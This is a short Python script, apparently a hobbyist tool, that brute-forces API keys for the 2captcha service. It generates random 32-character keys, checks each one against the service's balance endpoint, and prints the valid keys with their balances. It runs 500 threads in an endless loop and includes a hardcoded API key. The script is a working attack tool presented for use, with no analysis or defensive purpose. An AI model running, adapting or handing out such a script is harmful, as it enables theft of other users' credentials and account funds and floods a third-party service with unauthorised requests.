import requests, PythonPlus, random
from PythonPlus import Colors
from threading import Thread
from time import strftime, gmtime

def Main():
    legit_key = '4c8c6379d01aaf308803fc4e63342bf0' # Some Shitty Key ;) 0 Bal
    rand_key = ''.join(random.choice(legit_key) for i in range(32))
    r = requests.get(f'http://2captcha.com/res.php?action=getbalance&key={rand_key}')
    if "ERROR_WRONG_USER_KEY" in r.text:
        print(f'{Colors.Red}[{Colors.Reset}{strftime("%H:%M:%S", gmtime())}{Colors.Red}]{Colors.Reset} Invalid: {Colors.Red}{rand_key} {Colors.Reset}')
    if "IP_BANNED" in r.text:
        print(f'{Colors.Red}[{Colors.Reset}{strftime("%H:%M:%S", gmtime())}{Colors.Red}]{Colors.Reset} Rate Limited')
    if "." in r.text:
        print(f'{Colors.Green}[{Colors.Reset}{strftime("%H:%M:%S", gmtime())}{Colors.Green}]{Colors.Reset} Valid: {Colors.Green}{rand_key} {Colors.Reset}| Balance: {Colors.Green}${r.text} {Colors.Reset}')

if __name__ == '__main__':
    while True:
            for i in range(0, 500):
                Thread(target=Main).start()
